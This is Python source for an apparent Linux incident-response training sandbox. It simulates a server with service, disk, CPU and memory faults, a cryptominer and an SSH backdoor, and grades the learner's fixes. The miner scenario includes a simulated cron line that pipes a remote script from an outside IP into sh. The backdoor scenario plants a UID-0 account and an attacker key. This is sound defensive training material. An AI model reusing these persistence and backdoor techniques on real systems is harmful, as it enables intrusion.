"""
Linux sandbox — a fake server with two randomly chosen real problems:
  failed_service  a service won't start: a stray old process holds its port
  disk_full       a runaway debug log filled / (and is held open by a process)
  runaway_cpu     a report script pegging the CPUs
  memory_hog      a batch job ate the RAM; the OOM killer took out postgres

Unlike the read-only Kubernetes and Docker sandboxes, this one reacts to
fixes: kill, systemctl restart/start, rm, and truncate change the state —
including the classic trap where rm on a file a process still holds open
frees no space until that process restarts (see linux-incident-002).
"""

import random
from datetime import datetime

from engine import normalize
from sandbox_common import render_table, run_loop

PROBLEMS = ["failed_service", "disk_full", "runaway_cpu", "memory_hog", "cryptominer", "ssh_backdoor"]

HELP_TEXT = """Supported commands:
  uptime   nproc   hostname   uname -a   free -h   df -h
  du -sh <dir>/*   du -sh <dir>   ls -lh <dir>   ls -l /proc/<pid>/exe
  ps aux [--sort=-%cpu | --sort=-%mem]   top
  systemctl status <svc>   systemctl --failed   systemctl list-units --type=service
  systemctl restart|start <svc>
  journalctl -u <svc> [-n N]   journalctl -p err   dmesg [-T]
  ss -tulnp (listening)   ss -tnp (established connections)   lsof +L1
  kill [-9] <pid>   pkill -f <pattern>   rm <file>   truncate -s 0 <file>
Security / investigation:
  cat <file>   grep [-i] <pattern> <file>   last [-a]   getent passwd   id <user>
  awk -F: '$3 == 0' /etc/passwd   crontab -l [-u <user>]   crontab -r [-u <user>]
  sed -i '/<pattern>/d' <file>   userdel [-r] <user>   iptables -I OUTPUT -d <ip> -j DROP
  (files worth reading: /etc/passwd, /var/log/auth.log, /etc/ssh/sshd_config,
   /root/.ssh/authorized_keys, /var/spool/cron/crontabs/<user>)
  help | exit          (pipes work: ps aux | grep python)"""

MINER_IP = "45.9.148.3"
ATTACKER_IP = "185.220.101.4"
OFFICE_IP = "198.51.100.23"
CRON_DIR = "/var/spool/cron/crontabs"

BASE_USED_GB = 9
DISK_SIZE_GB = 50


def _svc(name, desc, port=None, pid=None):
    return {"name": name, "description": desc, "active": "active", "enabled": True,
            "port": port, "pid": pid, "journal": [f"Started {desc}."], "blocked_by": None,
            "killed_by_oom": False}


def generate_state(seed=None, problems=None) -> dict:
    """Random 2 problems by default; mystery incidents pass an explicit
    list so the root cause is known in advance."""
    rng = random.Random(seed)
    problems = list(problems) if problems is not None else rng.sample(PROBLEMS, k=2)
    nproc = rng.choice([2, 4])
    mem_total = rng.choice([4096, 8192])

    services = [
        _svc("sshd", "OpenSSH server daemon", 22, 610),
        _svc("cron", "Regular background program processing daemon", None, 640),
        _svc("nginx", "A high performance web server", 80, 812),
        _svc("app", "Acme API server", 8080, 1204),
        _svc("worker", "Acme background worker", None, 1290),
        _svc("postgres", "PostgreSQL database server", 5432, 920),
    ]
    processes = [
        {"pid": 1, "user": "root", "cpu": 0.0, "mem_mb": 12, "command": "/sbin/init"},
        {"pid": 610, "user": "root", "cpu": 0.0, "mem_mb": 8, "command": "sshd: /usr/sbin/sshd -D"},
        {"pid": 640, "user": "root", "cpu": 0.0, "mem_mb": 3, "command": "/usr/sbin/cron -f"},
        {"pid": 812, "user": "www-data", "cpu": 0.4, "mem_mb": 24, "command": "nginx: master process"},
        {"pid": 1204, "user": "appsvc", "cpu": 3.1, "mem_mb": 310, "command": "node /opt/app/server.js"},
        {"pid": 1290, "user": "appsvc", "cpu": 1.2, "mem_mb": 180, "command": "python3 /opt/worker/run.py"},
        {"pid": 920, "user": "postgres", "cpu": 0.8, "mem_mb": 420, "command": "postgres: main"},
    ]
    files = {
        "/var/log/syslog": {"size_gb": 0.2, "open_by": None, "deleted": False},
        "/var/log/nginx/access.log": {"size_gb": 0.6, "open_by": "nginx", "deleted": False},
        "/var/log/worker/worker.log": {"size_gb": 0.1, "open_by": "worker", "deleted": False},
        "/var/lib/postgresql/data": {"size_gb": 3.2, "open_by": "postgres", "deleted": False},
    }
    dmesg = ["[    0.000000] Linux version 6.8.0-45-generic", "[    2.114502] EXT4-fs (sda1): mounted filesystem"]

    by_name = {s["name"]: s for s in services}

    if "failed_service" in problems:
        stray_pid = rng.randint(2000, 2999)
        processes.append({"pid": stray_pid, "user": "deploy", "cpu": 0.2, "mem_mb": 90,
                          "command": "node /home/deploy/old-api/server.js"})
        app = by_name["app"]
        app.update(active="failed", pid=None, blocked_by=stray_pid, journal=[
            "Started Acme API server.",
            "Error: listen EADDRINUSE: address already in use :::8080",
            "app.service: Main process exited, code=exited, status=1/FAILURE",
            "app.service: Failed with result 'exit-code'.",
        ])
        processes[:] = [p for p in processes if p["pid"] != 1204]
        app["stray_listener"] = stray_pid

    if "disk_full" in problems:
        files["/var/log/worker/debug.log"] = {"size_gb": 35.5, "open_by": "worker", "deleted": False}
        by_name["worker"]["journal"].append("DEBUG logging enabled (LOG_LEVEL=debug)")

    if "runaway_cpu" in problems:
        processes.append({"pid": rng.randint(3000, 3999), "user": "reports", "cpu": round(nproc * 99.0, 1),
                          "mem_mb": 150, "command": "python3 /opt/reports/generate.py --all-time"})

    if "memory_hog" in problems:
        hog_pid = rng.randint(4000, 4999)
        processes.append({"pid": hog_pid, "user": "batch", "cpu": 12.0, "mem_mb": int(mem_total * 0.8),
                          "command": "java -Xmx8g -jar /opt/batch/batch.jar"})
        pg = by_name["postgres"]
        pg.update(active="failed", pid=None, killed_by_oom=True, journal=[
            "Started PostgreSQL database server.",
            "postgres.service: Main process exited, code=killed, status=9/KILL",
            "postgres.service: Failed with result 'signal'.",
        ])
        processes[:] = [p for p in processes if p["pid"] != 920]
        dmesg += [f"[86412.338101] Out of memory: Killed process 920 (postgres) total-vm:6412000kB",
                  "[86412.341007] oom_reaper: reaped process 920 (postgres)"]
        pg["oom_hog"] = hog_pid

    state = {
        "generated_at": datetime.now().isoformat(timespec="seconds"),
        "hostname": f"srv-{rng.choice(['api', 'web', 'app'])}-{rng.randint(1, 9):02d}",
        "nproc": nproc,
        "mem_total_mb": mem_total,
        "uptime_days": rng.randint(3, 180),
        "services": services,
        "processes": processes,
        "files": files,
        "dmesg": dmesg,
        "problems": problems,
    }
    _add_security_state(state, rng, problems)
    return state


def _add_security_state(state, rng, problems):
    """Text files, logins, and connections every server has, plus the two
    compromise scenarios. Kept separate (and drawing from rng last) so the
    original four problems keep their seeded values."""
    host = state["hostname"]
    text = {
        "/etc/passwd": [
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
            "postgres:x:113:120:PostgreSQL administrator:/var/lib/postgresql:/bin/bash",
            "appsvc:x:1001:1001::/opt/app:/usr/sbin/nologin",
            "deploy:x:1002:1002:Deploy user:/home/deploy:/bin/bash",
        ],
        "/root/.ssh/authorized_keys": [
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHr8Tq0mV3cK7yP2fQ9sL4wN1bX6dJ5eR8tU0iO3aZ7 ops@acme",
        ],
        "/etc/ssh/sshd_config": [
            "Port 22",
            "PermitRootLogin prohibit-password",
            "PasswordAuthentication no",
            "PubkeyAuthentication yes",
        ],
        f"{CRON_DIR}/root": ["0 3 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1"],
        f"{CRON_DIR}/appsvc": ["30 2 * * * /opt/worker/nightly-report.sh"],
        "/var/log/auth.log": [
            f"Sep 27 08:02:11 {host} sshd[2211]: Accepted publickey for deploy from {OFFICE_IP} port 50412 ssh2: ED25519 SHA256:k3JqZ0",
            f"Sep 27 09:15:40 {host} sshd[2290]: Failed password for invalid user admin from 103.45.12.9 port 39922 ssh2",
            f"Sep 27 09:15:44 {host} sshd[2291]: Failed password for invalid user oracle from 103.45.12.9 port 39930 ssh2",
        ],
    }
    state["text_files"] = text
    state["logins"] = [
        f"deploy   pts/0        {OFFICE_IP}    Sat Sep 27 08:02   still logged in",
        f"deploy   pts/0        {OFFICE_IP}    Fri Sep 26 09:11 - 17:40  (08:29)",
    ]
    state["connections"] = [
        {"local": "127.0.0.1:43210", "remote": "127.0.0.1:5432", "process": "node", "pid": 1204},
    ]
    state["blocked_ips"] = []
    state["respawn_pending"] = False

    if "cryptominer" in problems:
        # Came in through a vulnerable upload page, so it runs as www-data.
        miner_pid = rng.randint(6000, 6999)
        state["processes"].append({"pid": miner_pid, "user": "www-data", "cpu": round(state["nproc"] * 97.5, 1),
                                   "mem_mb": 380, "command": "/tmp/.x/kdevtmpfsi"})
        state["connections"].append({"local": "10.0.1.15:51876", "remote": f"{MINER_IP}:3333",
                                     "process": "kdevtmpfsi", "pid": miner_pid})
        state["files"]["/tmp/.x/kdevtmpfsi"] = {"size_gb": 0.0024, "open_by": None, "deleted": False}
        text[f"{CRON_DIR}/www-data"] = [f"*/5 * * * * curl -fsSL http://{MINER_IP}/ldr.sh | sh > /dev/null 2>&1"]
        state["miner_pid"] = miner_pid

    if "ssh_backdoor" in problems:
        text["/etc/ssh/sshd_config"][1:3] = ["PermitRootLogin yes", "PasswordAuthentication yes"]
        text["/etc/passwd"].append("sysupdate:x:0:0::/var/tmp/.sys:/bin/bash")
        text["/root/.ssh/authorized_keys"].append(
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4xKz9QmW2vB8nT5rY1cH7jL0sF3dG6aE9uI2oN4pX sysadmin@kali")
        brute = [f"Sep 27 03:1{m}:{s:02d} {host} sshd[77{m}{s % 10}]: Failed password for root from {ATTACKER_IP} port {40000 + s} ssh2"
                 for m, s in [(1, 2), (1, 9), (2, 14), (2, 33), (3, 51)]]
        text["/var/log/auth.log"][0:0] = brute + [
            f"Sep 27 03:14:07 {host} sshd[7712]: Accepted password for root from {ATTACKER_IP} port 51122 ssh2",
            f"Sep 27 03:16:40 {host} useradd[7730]: new user: name=sysupdate, UID=0, GID=0, home=/var/tmp/.sys, shell=/bin/bash",
            f"Sep 27 03:20:02 {host} sshd[7751]: Accepted password for sysupdate from {ATTACKER_IP} port 51190 ssh2",
            f"Sep 27 03:38:15 {host} sshd[7802]: Accepted publickey for root from {ATTACKER_IP} port 51244 ssh2: ED25519 SHA256:q2VtX9",
        ]
        state["logins"][:0] = [
            f"root     pts/2        {ATTACKER_IP}    Sat Sep 27 03:38 - 03:41  (00:03)",
            f"sysupdate pts/1       {ATTACKER_IP}    Sat Sep 27 03:20 - 03:22  (00:02)",
            f"root     pts/1        {ATTACKER_IP}    Sat Sep 27 03:14 - 03:17  (00:03)",
        ]


# ------------------------------------------------------------------ helpers

def _service(state, name):
    name = name.removesuffix(".service")
    return next((s for s in state["services"] if s["name"] == name), None)


def _process(state, pid):
    return next((p for p in state["processes"] if p["pid"] == pid), None)


def _service_running(state, name) -> bool:
    s = _service(state, name)
    return bool(s and s["active"] == "active")


def _disk_used_gb(state) -> float:
    used = BASE_USED_GB
    for f in state["files"].values():
        if not f["deleted"]:
            used += f["size_gb"]
        elif f["open_by"] and _service_running(state, f["open_by"]):
            used += f["size_gb"]  # deleted but still held open: space not freed
    return used


def _gb(value: float) -> str:
    return f"{value:.1f}G" if value < 10 else f"{value:.0f}G"


def _load(state) -> float:
    return round(0.3 + sum(p["cpu"] for p in state["processes"]) / 100, 2)


def _mem_used(state) -> int:
    return sum(p["mem_mb"] for p in state["processes"]) + 400


# ----------------------------------------------------------------- commands

def cmd_uptime(state) -> str:
    load = _load(state)
    return (f" 10:42:01 up {state['uptime_days']} days,  2 users,  load average: "
            f"{load:.2f}, {load * 0.9:.2f}, {load * 0.6:.2f}")


def cmd_free(state) -> str:
    total = state["mem_total_mb"]
    used = min(_mem_used(state), total - 60)
    avail = total - used
    rows = [["Mem:", f"{total / 1024:.1f}Gi", f"{used / 1024:.1f}Gi", f"{avail * 0.4 / 1024:.1f}Gi",
             f"{avail / 1024:.1f}Gi"], ["Swap:", "0B", "0B", "0B", ""]]
    return render_table(["", "total", "used", "free", "available"], rows)


def cmd_df(state) -> str:
    used = min(_disk_used_gb(state), DISK_SIZE_GB)
    pct = round(used / DISK_SIZE_GB * 100)
    rows = [["/dev/sda1", f"{DISK_SIZE_GB}G", _gb(used), _gb(max(DISK_SIZE_GB - used, 0)), f"{pct}%", "/"],
            ["tmpfs", "2.0G", "0", "2.0G", "0%", "/dev/shm"]]
    return render_table(["Filesystem", "Size", "Used", "Avail", "Use%", "Mounted on"], rows)


def _visible_files(state) -> dict:
    return {path: f for path, f in state["files"].items() if not f["deleted"]}


def cmd_du(state, target: str) -> str:
    target = target.rstrip("/")
    list_children = target.endswith("/*")
    base = target[:-2] if list_children else target
    base = base.rstrip("/") or "/"
    files = _visible_files(state)

    def size_under(prefix):
        return sum(f["size_gb"] for p, f in files.items() if p == prefix or p.startswith(prefix.rstrip("/") + "/"))

    if not list_children:
        if size_under(base) == 0 and not any(p.startswith(base) for p in files):
            return f"du: cannot access '{base}': No such file or directory"
        return f"{_gb(size_under(base))}\t{base}"

    children = {}
    for path in files:
        if path.startswith(base.rstrip("/") + "/"):
            child = base.rstrip("/") + "/" + path[len(base.rstrip("/")) + 1:].split("/")[0]
            children[child] = size_under(child)
    if not children:
        return f"du: cannot access '{base}/*': No such file or directory"
    return "\n".join(f"{_gb(size)}\t{path}" for path, size in sorted(children.items()))


def cmd_ls(state, directory: str) -> str:
    directory = directory.rstrip("/")
    if directory.startswith("/proc/") and directory.endswith("/exe"):
        pid = directory.split("/")[2]
        return cmd_proc_exe(state, int(pid)) if pid.isdigit() else "ls: invalid pid"
    entries = [(p, f) for p, f in _visible_files(state).items() if p.rsplit("/", 1)[0] == directory]
    lines = [f"-rw-r--r-- 1 appsvc appsvc {_gb(f['size_gb']):>6} Sep 27 10:40 {p.rsplit('/', 1)[1]}"
             for p, f in entries]
    if directory == "/tmp/.x":
        lines = [l.replace("-rw-r--r-- 1 appsvc appsvc", "-rwxr-xr-x 1 www-data www-data") for l in lines]
    lines += [f"-rw------- 1 root root {len(chr(10).join(t)):>6} Sep 27 03:16 {p.rsplit('/', 1)[1]}"
              for p, t in state.get("text_files", {}).items() if p.rsplit("/", 1)[0] == directory]
    if not lines:
        return f"ls: cannot access '{directory}': No such file or directory"
    return "\n".join(lines)


def cmd_ps(state, sort_key) -> str:
    procs = list(state["processes"])
    if sort_key == "cpu":
        procs.sort(key=lambda p: -p["cpu"])
    elif sort_key == "mem":
        procs.sort(key=lambda p: -p["mem_mb"])
    total = state["mem_total_mb"]
    rows = [[p["user"], p["pid"], f"{p['cpu']:.1f}", f"{p['mem_mb'] / total * 100:.1f}", p["mem_mb"] * 1024,
             p["command"]] for p in procs]
    return render_table(["USER", "PID", "%CPU", "%MEM", "RSS", "COMMAND"], rows)


def cmd_top(state) -> str:
    load = _load(state)
    header = (f"top - 10:42:01 up {state['uptime_days']} days, load average: {load:.2f}\n"
              f"MiB Mem : {state['mem_total_mb']} total, {min(_mem_used(state), state['mem_total_mb'] - 60)} used\n")
    return header + "\n" + cmd_ps(state, "cpu")


def cmd_systemctl_status(state, name) -> str:
    s = _service(state, name)
    if not s:
        return f"Unit {name}.service could not be found."
    if s["active"] == "active":
        state_line = "active (running) since Sat 2026-09-27 08:00:12"
        pid_line = f"\n   Main PID: {s['pid']} ({s['name']})"
    else:
        state_line = "failed (Result: exit-code) since Sat 2026-09-27 03:12:05"
        pid_line = ""
    tail = "\n".join(f"Sep 27 {s['name']}[{s['pid'] or 0}]: {line}" for line in s["journal"][-3:])
    return (f"● {s['name']}.service - {s['description']}\n"
            f"     Loaded: loaded (/lib/systemd/system/{s['name']}.service; "
            f"{'enabled' if s['enabled'] else 'disabled'})\n"
            f"     Active: {state_line}{pid_line}\n\n{tail}")


def cmd_systemctl_failed(state) -> str:
    failed = [s for s in state["services"] if s["active"] == "failed"]
    if not failed:
        return "0 loaded units listed."
    rows = [[f"● {s['name']}.service", "loaded", "failed", "failed", s["description"]] for s in failed]
    return render_table(["UNIT", "LOAD", "ACTIVE", "SUB", "DESCRIPTION"], rows) + f"\n\n{len(failed)} loaded units listed."


def cmd_list_units(state) -> str:
    rows = [[f"{s['name']}.service", "loaded", s["active"], "running" if s["active"] == "active" else "failed",
             s["description"]] for s in state["services"]]
    return render_table(["UNIT", "LOAD", "ACTIVE", "SUB", "DESCRIPTION"], rows)


def cmd_restart(state, name) -> str:
    s = _service(state, name)
    if not s:
        return f"Failed to restart {name}.service: Unit {name}.service not found."
    blocker = s.get("blocked_by")
    if blocker and _process(state, blocker):
        s["active"] = "failed"
        s["journal"].append("Error: listen EADDRINUSE: address already in use :::8080")
        return (f"Job for {s['name']}.service failed because the control process exited with error code.\n"
                f"See \"systemctl status {s['name']}.service\" and \"journalctl -xeu {s['name']}.service\" for details.")
    hog = s.get("oom_hog")
    if hog and _process(state, hog):
        s["journal"].append("postgres.service: Main process exited, code=killed, status=9/KILL")
        state["dmesg"].append(f"[86999.100200] Out of memory: Killed process {s['pid'] or 921} (postgres)")
        return (f"Job for {s['name']}.service failed. The process was killed shortly after starting.\n"
                f"See \"journalctl -u {s['name']}\" and \"dmesg -T\" for details.")
    if s["active"] != "active" or s["pid"] is None:
        s["pid"] = random.randint(5000, 5999)
        s["active"] = "active"
        state["processes"].append({"pid": s["pid"], "user": "appsvc", "cpu": 1.0, "mem_mb": 200,
                                   "command": f"{s['name']} (restarted)"})
    s["journal"].append(f"Started {s['description']}.")
    # Restarting releases file handles: deleted-but-open files are freed.
    for path, f in list(state["files"].items()):
        if f["deleted"] and f["open_by"] == s["name"]:
            del state["files"][path]
    return ""


def cmd_journal(state, name, n) -> str:
    if name.removesuffix(".service") in ("ssh", "sshd"):
        lines = [l for l in state["text_files"]["/var/log/auth.log"] if "sshd[" in l]
        return "\n".join(lines[-n:] if n else lines)
    s = _service(state, name)
    if not s:
        return "-- No entries --"
    lines = s["journal"][-n:] if n else s["journal"]
    return "\n".join(f"Sep 27 03:12:05 {state['hostname']} {s['name']}[{s['pid'] or 0}]: {l}" for l in lines)


def cmd_journal_errors(state) -> str:
    lines = []
    for s in state["services"]:
        lines += [f"Sep 27 {s['name']}: {l}" for l in s["journal"] if any(w in l for w in ("Error", "Failed", "KILL", "FAILURE"))]
    lines += [f"Sep 27 kernel: {l.split('] ', 1)[1]}" for l in state["dmesg"] if "Out of memory" in l]
    return "\n".join(lines) or "-- No entries --"


def cmd_dmesg(state) -> str:
    return "\n".join(state["dmesg"])


def cmd_ss(state) -> str:
    rows = []
    for s in state["services"]:
        if s["port"] and s["active"] == "active":
            rows.append(["tcp", "LISTEN", f"0.0.0.0:{s['port']}", f"users:((\"{s['name']}\",pid={s['pid']}))"])
    for s in state["services"]:
        stray = s.get("stray_listener")
        if stray and _process(state, stray):
            rows.append(["tcp", "LISTEN", f"*:{s['port']}", f"users:((\"node\",pid={stray}))"])
    return render_table(["Netid", "State", "Local Address:Port", "Process"], rows)


def cmd_lsof_deleted(state) -> str:
    rows = []
    for path, f in state["files"].items():
        s = _service(state, f["open_by"]) if f["open_by"] else None
        if f["deleted"] and s and s["active"] == "active":
            rows.append([s["name"], s["pid"], "appsvc", "4w", "REG", int(f["size_gb"] * 1024 ** 3), 0, f"{path} (deleted)"])
    if not rows:
        return ""
    return render_table(["COMMAND", "PID", "USER", "FD", "TYPE", "SIZE/OFF", "NLINK", "NAME"], rows)


def cmd_kill(state, pid: int) -> str:
    p = _process(state, pid)
    if not p:
        return f"bash: kill: ({pid}) - No such process"
    state["processes"].remove(p)
    if "kdevtmpfsi" in p["command"]:
        state["respawn_pending"] = True
    for s in state["services"]:
        if s["pid"] == pid:
            s["active"], s["pid"] = "failed", None
            s["journal"].append(f"{s['name']}.service: Main process exited, code=killed, status=15/TERM")
    return ""


def cmd_rm(state, path: str) -> str:
    f = state["files"].get(path)
    if not f or f["deleted"]:
        return f"rm: cannot remove '{path}': No such file or directory"
    f["deleted"] = True
    return ""


def cmd_truncate(state, path: str) -> str:
    f = state["files"].get(path)
    if not f or f["deleted"]:
        return f"truncate: cannot open '{path}' for writing: No such file or directory"
    f["size_gb"] = 0.0
    return ""


# ------------------------------------------------------- security commands
# Input arrives lowercased (engine.normalize), so every text match below is
# case-insensitive against the file contents.

def _text(state, path):
    return state.get("text_files", {}).get(path)


def _strip_quotes(s: str) -> str:
    return s.strip("'\"")


def cmd_cat(state, path: str) -> str:
    lines = _text(state, path)
    if lines is None:
        if path in state["files"] and not state["files"][path]["deleted"]:
            return "(binary or large file; try ls -lh, or tail on a log)"
        return f"cat: {path}: No such file or directory"
    return "\n".join(lines)


def cmd_grep_file(state, pattern: str, path: str, invert: bool = False) -> str:
    lines = _text(state, path)
    if lines is None:
        return f"grep: {path}: No such file or directory"
    return "\n".join(l for l in lines if (pattern.lower() in l.lower()) != invert)


def _miner_persistence(state) -> bool:
    return any("ldr.sh" in line for path, lines in state.get("text_files", {}).items()
               if path.startswith(CRON_DIR) for line in lines)


def _maybe_respawn(state):
    """Cron runs every few minutes. If the miner was killed but its cron
    entry survived, it's back on the next command — with a new pid. Blocking
    the download server AND deleting the binary also stops it."""
    if not state.get("respawn_pending"):
        return
    state["respawn_pending"] = False
    if not _miner_persistence(state):
        return
    binary_gone = state["files"].get("/tmp/.x/kdevtmpfsi", {}).get("deleted", True)
    if binary_gone and MINER_IP in state["blocked_ips"]:
        return
    new_pid = state.get("miner_pid", 6000) + random.randint(100, 400)
    state["processes"].append({"pid": new_pid, "user": "www-data", "cpu": round(state["nproc"] * 97.5, 1),
                               "mem_mb": 380, "command": "/tmp/.x/kdevtmpfsi"})
    if MINER_IP not in state["blocked_ips"]:
        state["connections"].append({"local": "10.0.1.15:52011", "remote": f"{MINER_IP}:3333",
                                     "process": "kdevtmpfsi", "pid": new_pid})
    state["files"]["/tmp/.x/kdevtmpfsi"] = {"size_gb": 0.0024, "open_by": None, "deleted": False}
    state["miner_pid"] = new_pid


def cmd_crontab(state, args) -> str:
    user = "root"
    if "-u" in args and args.index("-u") + 1 < len(args):
        user = args[args.index("-u") + 1]
    path = f"{CRON_DIR}/{user}"
    if "-r" in args:
        if path not in state["text_files"]:
            return f"no crontab for {user}"
        del state["text_files"][path]
        return ""
    lines = _text(state, path)
    return "\n".join(lines) if lines else f"no crontab for {user}"


def cmd_sed_delete(state, norm_args) -> str:
    """Only the delete form: sed -i '/pattern/d' <file>."""
    script = next((_strip_quotes(a) for a in norm_args if _strip_quotes(a).startswith("/")
                   and _strip_quotes(a).endswith("/d")), None)
    files = [a for a in norm_args if a.startswith("/") and not a.endswith("/d") and not a.endswith("/d'")]
    if "-i" not in norm_args or not script or not files:
        return "(the sandbox supports only: sed -i '/pattern/d' <file>)"
    pattern = script[1:-2]
    lines = _text(state, files[-1])
    if lines is None:
        return f"sed: can't read {files[-1]}: No such file or directory"
    state["text_files"][files[-1]] = [l for l in lines if pattern not in l.lower()]
    return ""


def _passwd_entries(state):
    return [l.split(":") for l in state["text_files"]["/etc/passwd"]]


def cmd_awk_passwd(state, norm: str) -> str:
    if "/etc/passwd" not in norm or "$3" not in norm:
        return "(the sandbox supports: awk -F: '$3 == 0' /etc/passwd)"
    rows = [e for e in _passwd_entries(state) if e[2] == "0"]
    if "print $1" in norm:
        return "\n".join(e[0] for e in rows)
    return "\n".join(":".join(e) for e in rows)


def cmd_userdel(state, name: str) -> str:
    before = state["text_files"]["/etc/passwd"]
    after = [l for l in before if not l.startswith(f"{name}:")]
    if len(after) == len(before):
        return f"userdel: user '{name}' does not exist"
    state["text_files"]["/etc/passwd"] = after
    return ""


def cmd_id(state, name: str) -> str:
    entry = next((e for e in _passwd_entries(state) if e[0] == name), None)
    if not entry:
        return f"id: '{name}': no such user"
    group = "root" if entry[3] == "0" else entry[0]
    return f"uid={entry[2]}({entry[0]}) gid={entry[3]}({group}) groups={entry[3]}({group})"


def cmd_ss_established(state) -> str:
    rows = [["tcp", "ESTAB", c["local"], c["remote"], f"users:((\"{c['process']}\",pid={c['pid']}))"]
            for c in state["connections"] if _process(state, c["pid"])]
    return render_table(["Netid", "State", "Local Address:Port", "Peer Address:Port", "Process"], rows)


def cmd_proc_exe(state, pid: int) -> str:
    p = _process(state, pid)
    if not p:
        return f"ls: cannot access '/proc/{pid}/exe': No such file or directory"
    target = p["command"].split()[0]
    deleted = " (deleted)" if state["files"].get(target, {}).get("deleted") else ""
    return f"lrwxrwxrwx 1 {p['user']} {p['user']} 0 Sep 27 10:40 /proc/{pid}/exe -> {target}{deleted}"


def cmd_pkill(state, pattern: str) -> str:
    victims = [p["pid"] for p in state["processes"] if pattern in p["command"].lower()]
    for pid in victims:
        cmd_kill(state, pid)
    return ""


def cmd_iptables_block(state, norm_args) -> str:
    if "-d" not in norm_args or "drop" not in norm_args:
        return "(the sandbox supports: iptables -I OUTPUT -d <ip> -j DROP)"
    ip = norm_args[norm_args.index("-d") + 1].split("/")[0]
    state["blocked_ips"].append(ip)
    state["connections"] = [c for c in state["connections"] if not c["remote"].startswith(ip + ":")]
    return ""


# ------------------------------------------------------------------ dispatch

def handle_command(state: dict, raw: str):
    norm = normalize(raw)
    if norm in {"exit", "quit", ":q"}:
        return None
    if norm in {"help", "?"}:
        return HELP_TEXT

    _maybe_respawn(state)
    tokens = norm.split()
    if tokens and tokens[0] == "sudo":
        tokens = tokens[1:]
    if not tokens:
        return HELP_TEXT
    cmd, args = tokens[0], tokens[1:]
    positional = [a for a in args if not a.startswith("-")]

    if cmd == "cat":
        return "\n".join(cmd_cat(state, p) for p in positional) if positional else "cat: missing file"
    if cmd == "grep" and len(positional) >= 2 and positional[-1].startswith("/"):
        pattern = _strip_quotes(" ".join(positional[:-1]))
        return cmd_grep_file(state, pattern, positional[-1], invert="-v" in args)
    if cmd == "crontab":
        return cmd_crontab(state, args)
    if cmd == "sed":
        return cmd_sed_delete(state, args)
    if cmd == "awk":
        return cmd_awk_passwd(state, norm)
    if cmd == "userdel":
        return cmd_userdel(state, positional[-1]) if positional else "userdel: missing user"
    if cmd == "id":
        return cmd_id(state, positional[0]) if positional else "uid=0(root) gid=0(root) groups=0(root)"
    if cmd == "getent" and positional[:1] == ["passwd"]:
        return "\n".join(state["text_files"]["/etc/passwd"])
    if cmd == "last":
        return "\n".join(state["logins"]) + "\n\nwtmp begins Mon Sep  1 00:00:01 2026"
    if cmd == "pkill":
        pattern = _strip_quotes(positional[-1]) if positional else ""
        return cmd_pkill(state, pattern) if pattern else "pkill: no matching criteria specified"
    if cmd == "iptables":
        return cmd_iptables_block(state, args)
    if cmd in ("ss", "netstat") and args and "l" not in args[0] and args[0].startswith("-"):
        return cmd_ss_established(state)

    if cmd == "uptime":
        return cmd_uptime(state)
    if cmd == "nproc":
        return str(state["nproc"])
    if cmd == "hostname":
        return state["hostname"]
    if cmd == "uname":
        return f"Linux {state['hostname']} 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux"
    if cmd == "free":
        return cmd_free(state)
    if cmd == "df":
        return cmd_df(state)
    if cmd == "du":
        return cmd_du(state, positional[0]) if positional else cmd_du(state, "/var")
    if cmd == "ls":
        return cmd_ls(state, positional[0]) if positional else "(try: ls -lh /var/log/worker)"
    if cmd == "ps":
        sort = "cpu" if "--sort=-%cpu" in args else "mem" if "--sort=-%mem" in args else None
        return cmd_ps(state, sort)
    if cmd in ("top", "htop"):
        return cmd_top(state)
    if cmd == "systemctl":
        if "--failed" in args or "--state=failed" in args:
            return cmd_systemctl_failed(state)
        if positional[:1] == ["list-units"]:
            return cmd_list_units(state)
        if positional[:1] == ["status"] and len(positional) > 1:
            return cmd_systemctl_status(state, positional[1])
        if positional[:1] in (["restart"], ["start"]) and len(positional) > 1:
            return cmd_restart(state, positional[1])
        return "(supported: systemctl status|restart|start <svc>, systemctl --failed, systemctl list-units)"
    if cmd == "journalctl":
        if "-p" in args and "err" in args:
            return cmd_journal_errors(state)
        unit = None
        for i, a in enumerate(args):
            if a == "-u" and i + 1 < len(args):
                unit = args[i + 1]
            elif a.startswith("-u") and len(a) > 2:
                unit = a[2:]
        n = next((int(args[i + 1]) for i, a in enumerate(args) if a == "-n" and i + 1 < len(args) and args[i + 1].isdigit()), None)
        if unit:
            return cmd_journal(state, unit, n)
        return "(try: journalctl -u <service> or journalctl -p err)"
    if cmd == "dmesg":
        return cmd_dmesg(state)
    if cmd in ("ss", "netstat"):
        return cmd_ss(state)
    if cmd == "lsof" and ("+l1" in args or "+L1" in args):
        return cmd_lsof_deleted(state)
    if cmd == "kill":
        pids = [a for a in positional if a.isdigit()]
        return cmd_kill(state, int(pids[0])) if pids else "kill: usage: kill [-9] pid"
    if cmd == "rm":
        return cmd_rm(state, positional[0]) if positional else "rm: missing operand"
    if cmd == "truncate":
        return cmd_truncate(state, positional[-1]) if positional else "truncate: missing file operand"
    return f"{cmd}: not simulated in the sandbox. Type 'help' for supported commands."


# ------------------------------------------------------- mystery/sandbox hooks

def placeholders(state: dict) -> dict:
    """Concrete values (pids) a mystery's solution_commands refer to, so a
    stored expert path works against the seeded state."""
    values = {}
    for s in state.get("services", []):
        if s.get("stray_listener"):
            values["stray_pid"] = s["stray_listener"]
        if s.get("oom_hog"):
            values["hog_pid"] = s["oom_hog"]
    for p in state.get("processes", []):
        if "generate.py" in p["command"]:
            values["runaway_pid"] = p["pid"]
        if "kdevtmpfsi" in p["command"]:
            values["miner_pid"] = p["pid"]
    return values


def _no_extra_uid0(state) -> bool:
    return [e[0] for e in _passwd_entries(state) if e[2] == "0"] == ["root"]


GOAL_CHECKS = {
    "service_active": lambda state, g: _service_running(state, g["service"]),
    "disk_below": lambda state, g: _disk_used_gb(state) / DISK_SIZE_GB * 100 < g["percent"],
    "load_below_nproc": lambda state, g: _load(state) < state["nproc"],
    # A killed miner can be pending a cron respawn: settle that first, so
    # 'kill then solve' can't pass while the persistence is still there.
    "process_gone": lambda state, g: (_maybe_respawn(state), not any(
        g["match"] in p["command"] for p in state["processes"]))[1],
    "persistence_removed": lambda state, g: not any(
